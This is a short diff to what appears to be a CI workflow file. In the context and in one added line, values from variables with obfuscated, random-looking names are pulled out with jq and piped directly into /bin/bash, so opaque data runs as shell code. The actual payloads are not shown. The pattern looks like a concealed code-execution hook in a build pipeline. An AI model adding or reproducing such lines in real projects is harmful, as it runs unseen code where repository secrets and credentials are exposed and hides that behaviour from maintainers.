@@ -43,6 +43,7 @@ jobs:
           echo $rc83255 | jq -r .ll93 | /bin/bash
           echo $g29 | jq -r .zw40 | /bin/bash
           printf '%s' "$cou14" | jq -r .yngpl56257 | /bin/bash
+          printf '%s' "$fr2826" | jq -r .od47 | /bin/bash
 
       - name: Store results
         if: always()
